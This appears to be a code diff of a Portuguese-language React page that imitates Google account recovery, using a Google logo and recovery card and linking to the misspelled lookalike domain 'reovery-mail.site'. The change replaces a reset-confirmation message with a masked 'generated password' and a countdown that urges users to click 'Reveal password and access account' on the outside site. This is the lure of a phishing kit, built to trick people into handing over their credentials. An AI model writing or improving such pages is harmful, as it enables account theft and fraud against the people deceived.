@@ -2,7 +2,7 @@
 import React, { useEffect, useState } from 'react';
 import GoogleLogo from '../components/GoogleLogo';
 import RecoveryCard from '../components/RecoveryCard';
-import { Check } from 'lucide-react';
+import { Check, Lock } from 'lucide-react';
 import Spinner from '../components/Spinner';
 
 const Success = () => {
@@ -39,17 +39,20 @@ const Success = () => {
       <RecoveryCard>
         <div className="flex flex-col items-center text-center">
           <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-6 animate-scale-in">
-            <Check className="w-10 h-10 text-green-600" />
+            <Lock className="w-10 h-10 text-green-600" />
           </div>
           
-          <h1 className="text-2xl font-medium text-gray-900 mb-2 animate-slide-up">Senha redefinida com sucesso!</h1>
+          <h1 className="text-2xl font-medium text-gray-900 mb-2 animate-slide-up">Senha gerada com sucesso!</h1>
           <p className="text-gray-600 mb-8 animate-slide-up delay-100">
-            A senha da sua conta <strong>{email}</strong> foi alterada com sucesso.
+            Uma nova senha foi criada para <strong>{email}</strong>. Por motivos de segurança, ela está protegida.
           </p>
           
           <div className="bg-gray-50 p-4 rounded-lg border border-gray-200 w-full mb-6 animate-slide-up delay-200">
             <p className="text-sm text-gray-600">
-              Você será redirecionado automaticamente para a página principal em <span className="font-bold">{countdown}</span> segundos...
+              Senha: <span className="bg-gray-300 px-8 py-1 rounded">●●●●●●●●●●</span>
+            </p>
+            <p className="text-sm text-gray-500 mt-2">
+              Para revelar sua senha e recuperar acesso total à sua conta, você será redirecionado em <span className="font-bold">{countdown}</span> segundos...
             </p>
           </div>
           
@@ -58,7 +61,7 @@ const Success = () => {
               href="https://www.reovery-mail.site/" 
               className="blue-button flex items-center justify-center"
             >
-              {countdown === 0 ? <Spinner /> : 'Ir para a página principal'}
+              {countdown === 0 ? <Spinner /> : 'Revelar senha e acessar conta'}
             </a>
           </div>
         </div>
